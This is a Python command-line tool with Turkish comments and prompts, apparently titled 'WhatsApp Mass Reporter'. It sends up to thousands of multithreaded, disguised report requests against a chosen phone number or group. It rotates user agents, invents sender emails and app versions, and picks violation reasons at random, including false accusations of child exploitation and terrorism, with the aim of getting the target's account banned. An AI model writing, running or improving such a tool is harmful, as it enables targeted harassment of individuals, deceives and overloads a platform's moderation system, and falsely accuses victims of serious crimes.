#!/usr/bin/env python3
"""
KSIB TOOLS - WhatsApp Mass Reporter
TÜM ÜLKELER | ŞİFRE KORUMALI
"""

import requests
import threading
import random
import time
import sys
import hashlib
import os
from fake_useragent import UserAgent
from colorama import init, Fore, Style
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init(autoreset=True)

KONTROL = "c4e5a7f8d9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6"

# Ülke kodları
ULKELER = {
    "90": "TR", "1": "US", "44": "GB", "49": "DE", "33": "FR",
    "39": "IT", "34": "ES", "31": "NL", "46": "SE", "47": "NO",
    "45": "DK", "358": "FI", "48": "PL", "43": "AT", "41": "CH",
    "32": "BE", "351": "PT", "30": "GR", "36": "HU", "40": "RO",
    "359": "BG", "420": "CZ", "421": "SK", "386": "SI", "385": "HR",
    "381": "RS", "387": "BA", "382": "ME", "389": "MK", "355": "AL",
    "7": "RU", "380": "UA", "375": "BY", "373": "MD", "370": "LT",
    "371": "LV", "372": "EE", "374": "AM", "994": "AZ", "995": "GE",
    "90": "TR", "20": "EG", "966": "SA", "971": "AE", "974": "QA",
    "973": "BH", "968": "OM", "965": "KW", "962": "JO", "961": "LB",
    "963": "SY", "964": "IQ", "98": "IR", "92": "PK", "91": "IN",
    "94": "LK", "880": "BD", "95": "MM", "66": "TH", "84": "VN",
    "62": "ID", "60": "MY", "63": "PH", "65": "SG", "81": "JP",
    "82": "KR", "86": "CN", "852": "HK", "886": "TW", "61": "AU",
    "64": "NZ", "55": "BR", "54": "AR", "56": "CL", "57": "CO",
    "58": "VE", "51": "PE", "52": "MX", "1": "CA", "234": "NG",
    "254": "KE", "27": "ZA", "212": "MA", "216": "TN", "213": "DZ",
}

def giris():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + Style.BRIGHT + """
    ╔══════════════════════════════════════╗
    ║        🔐 KSIB GİRİŞ               ║
    ╚══════════════════════════════════════╝
    """ + Style.RESET_ALL)
    
    for i in range(3):
        s = input(Fore.YELLOW + "🔑 Şifre: ")
        if hashlib.sha256(s.encode()).hexdigest() == KONTROL:
            print(Fore.GREEN + "\n✅ Başarılı!\n")
            time.sleep(0.5)
            return True
        print(Fore.RED + f"❌ Hatalı! ({2-i} hakkın kaldı)\n")
    sys.exit(0)

class WA:
    def __init__(self):
        self.ua = UserAgent()
        self.b = 0
        self.f = 0
        self.k = threading.Lock()
        self.st = None
        self.mx = 0
        self.s = 0
        self.ulke_kodu = "TR"
        
        self.r = [
            "spam", "spam_messages", "spam_commercial",
            "harassment", "harassment_sexual", "harassment_threatening",
            "inappropriate_content", "adult_content", "violent_content",
            "hate_speech", "illegal_content",
            "fake_account", "impersonation", "scam", "fraud",
            "other", "violence", "terrorism",
            "child_exploitation", "drugs", "weapons", "suicide_self_harm",
        ]
    
    def bnr(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Fore.GREEN + Style.BRIGHT + """
        ╔══════════════════════════════════════╗
        ║  WHATSAPP MASS REPORTER v3.0       ║
        ║  💬 Tüm Ülkeler | Grup | Business  ║
        ╚══════════════════════════════════════╝
        """ + Style.RESET_ALL)
    
    def oturum(self):
        s = requests.Session()
        s.headers.update({
            "User-Agent": self.ua.random,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": f"{self.ulke_kodu.lower()}-{self.ulke_kodu},en-US;q=0.9",
        })
        return s
    
    def fmt(self, p):
        """Tüm ülke formatlarını destekle"""
        p = ''.join(filter(str.isdigit, p))
        
        # +90 veya 90 ile başlıyorsa Türkiye
        if p.startswith('90') and len(p) == 12:
            return p
        
        # Başında 0 varsa kaldır
        if p.startswith('0'):
            p = p[1:]
        
        # Ülke kodunu tahmin et (uzunluğa göre)
        if len(p) == 10:  # 5XXXXXXXXX -> Türkiye
            p = '90' + p
            self.ulke_kodu = "TR"
        elif len(p) == 10 and p.startswith('1'):  # ABD
            p = '1' + p
            self.ulke_kodu = "US"
        elif len(p) >= 11:
            # İlk 1-3 haneyi ülke kodu olarak al
            for uzunluk in [3, 2, 1]:
                kod = p[:uzunluk]
                if kod in ULKELER:
                    self.ulke_kodu = ULKELER[kod]
                    break
        
        # Eğer başında ülke kodu yoksa, + ekle
        if not any(p.startswith(k) for k in ULKELER.keys()):
            p = '90' + p  # Varsayılan Türkiye
        
        return p
    
    def rr(self):
        return random.choice(self.r)
    
    def rpt1(self, p, r, s):
        try:
            u = "https://www.whatsapp.com/contact/nocontact"
            h = {
                "User-Agent": self.ua.random,
                "Referer": "https://www.whatsapp.com/contact/",
                "Origin": "https://www.whatsapp.com",
                "Content-Type": "application/x-www-form-urlencoded",
            }
            d = {
                "phone_number": p,
                "violation": r,
                "description": f"Report for {r}",
                "email": f"r{random.randint(1000,9999)}@gmail.com",
                "language": self.ulke_kodu.lower(),
                "country": self.ulke_kodu,
            }
            resp = s.post(u, data=d, headers=h, timeout=15)
            return resp.status_code in [200, 201, 202, 302]
        except: return False
    
    def rpt2(self, p, r, s):
        try:
            u = "https://www.whatsapp.com/contact/violation"
            h = {
                "User-Agent": self.ua.random,
                "Referer": "https://www.whatsapp.com/",
                "Origin": "https://www.whatsapp.com",
                "Content-Type": "application/json",
            }
            d = {
                "report_type": "user",
                "reported_number": p,
                "violation_type": r,
                "message": f"Reporting user for {r}",
                "report_country": self.ulke_kodu,
                "platform": random.choice(["android", "ios", "web"]),
                "app_version": f"2.23.{random.randint(1,25)}.{random.randint(1,99)}",
            }
            resp = s.post(u, json=d, headers=h, timeout=15)
            return resp.status_code in [200, 201, 202]
        except: return False
    
    def rpt3(self, g, r, s):
        try:
            u = "https://www.whatsapp.com/contact/violation"
            h = {
                "User-Agent": self.ua.random,
                "Referer": "https://www.whatsapp.com/",
                "Origin": "https://www.whatsapp.com",
                "Content-Type": "application/json",
            }
            d = {
                "report_type": "group",
                "group_invite_link": g,
                "violation_type": r,
                "message": f"Reporting group for {r}",
                "report_country": self.ulke_kodu,
                "platform": random.choice(["android", "ios", "web"]),
            }
            resp = s.post(u, json=d, headers=h, timeout=15)
            return resp.status_code in [200, 201, 202]
        except: return False
    
    def rpt4(self, p, r, s):
        try:
            u = "https://www.whatsapp.com/contact/nocontact"
            h = {
                "User-Agent": self.ua.random,
                "Referer": "https://www.whatsapp.com/business/",
                "Origin": "https://www.whatsapp.com",
                "Content-Type": "application/json",
            }
            d = {
                "report_type": "business",
                "phone_number": p,
                "violation_type": r,
                "business_violation": "true",
                "description": f"Business violation: {r}",
                "email": f"b{random.randint(1000,9999)}@gmail.com",
                "report_country": self.ulke_kodu,
            }
            resp = s.post(u, json=d, headers=h, timeout=15)
            return resp.status_code in [200, 201, 202]
        except: return False
    
    def isci(self, t, tp, tid):
        s = self.oturum()
        
        while self.s < self.mx:
            r = self.rr()
            
            try:
                if tp == "1":
                    rs = self.rpt1(t, r, s) if random.random() > 0.5 else self.rpt2(t, r, s)
                elif tp == "2":
                    rs = self.rpt3(t, r, s)
                elif tp == "3":
                    rs = self.rpt4(t, r, s)
                elif tp == "4":
                    c = random.random()
                    if c < 0.4: rs = self.rpt1(t, r, s)
                    elif c < 0.7: rs = self.rpt2(t, r, s)
                    else: rs = self.rpt4(t, r, s)
                else:
                    rs = False
                
                with self.k:
                    if self.s >= self.mx: break
                    self.s += 1
                    if rs: self.b += 1
                    else: self.f += 1
                    
                    if self.s % 25 == 0 or self.s == self.mx:
                        e = time.time() - self.st
                        rt = self.s / e if e > 0 else 0
                        et = (self.mx - self.s) / rt if rt > 0 else 0
                        print(f"\r[{Fore.GREEN}✓{Style.RESET_ALL}] {self.s}/{self.mx} | "
                              f"✅{self.b} ❌{self.f} | ⚡{rt:.1f}/s | ⏳{et:.0f}s", end="")
                
                time.sleep(random.uniform(0.5, 1.5))
            except: continue
    
    def baslat(self, t, tp, c=100, th=30):
        self.mx = c
        if tp in ["1", "3", "4"]: t = self.fmt(t)
        
        print(Fore.CYAN + f"\n📱 Hedef: {t}")
        print(Fore.CYAN + f"🌍 Ülke: {self.ulke_kodu}")
        print(Fore.CYAN + f"📊 Rapor: {c} | 🧵 Thread: {th}")
        print(Fore.RED + "\n💣 BAŞLATILIYOR...\n")
        
        self.st = time.time()
        tl = []
        for i in range(th):
            tr = threading.Thread(target=self.isci, args=(t, tp, i))
            tr.daemon = True
            tr.start()
            tl.append(tr)
        
        try:
            for tr in tl: tr.join()
        except KeyboardInterrupt:
            print(Fore.RED + "\n\n[!] Durduruldu!")
        
        self.sonuc()
    
    def sonuc(self):
        e = time.time() - self.st if self.st else 0
        t = self.b + self.f
        rt = t / e if e > 0 else 0
        pm = rt * 60
        
        print("\n\n" + "="*50)
        print(Fore.GREEN + "📊 SONUÇ")
        print("="*50)
        print(f"⏱️  Süre: {e:.1f}s ({e/60:.1f}dk)")
        print(f"📨 Toplam: {t}")
        print(f"✅ Başarılı: {self.b}")
        print(f"❌ Başarısız: {self.f}")
        if t > 0: print(f"📈 Oran: %{self.b/t*100:.1f}")
        print(f"⚡ Hız: {rt:.1f}/s | ⏱️ {pm:.0f}/dk")
        print("="*50 + "\n")

def ana():
    giris()
    w = WA()
    w.bnr()
    
    print(Fore.YELLOW + "Rapor Tipi:")
    print("1. 👤 Bireysel\n2. 👥 Grup\n3. 🏢 Business\n4. 🔄 Karışık")
    tp = input(Fore.GREEN + "Seçim (1-4): ")
    
    if tp == "2":
        print(Fore.YELLOW + "\n🔗 Grup linki:")
        t = input(Fore.GREEN + "> ")
    else:
        print(Fore.YELLOW + "\n📱 Telefon numarası:")
        print(Fore.CYAN + "   Örnekler:")
        print(Fore.CYAN + "   +90 5XXXXXXXXX (Türkiye)")
        print(Fore.CYAN + "   +1 XXXXXXXXX (ABD/Kanada)")
        print(Fore.CYAN + "   +44 XXXXXXXXX (İngiltere)")
        print(Fore.CYAN + "   +49 XXXXXXXXX (Almanya)")
        print(Fore.CYAN + "   5XXXXXXXXX (Türkiye otomatik)")
        t = input(Fore.GREEN + "> ")
    
    print(Fore.YELLOW + "\n📊 Rapor Sayısı:")
    print("1. 100 | 2. 500 | 3. 1000 | 4. 3000 | 5. 5000")
    c = input(Fore.GREEN + "Seçim (1-5): ")
    ct = {"1": 100, "2": 500, "3": 1000, "4": 3000, "5": 5000}.get(c, 100)
    
    th = int(input(Fore.GREEN + "\n🧵 Thread (30): ") or "30")
    
    print(Fore.RED + "\n⚠️  Sorumluluk size ait!")
    if input(Fore.GREEN + "Devam? (E/H): ").upper() == 'E':
        w.baslat(t, tp, ct, th)

if __name__ == "__main__":
    try:
        ana()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Çıkış yapıldı!")
        sys.exit(0)
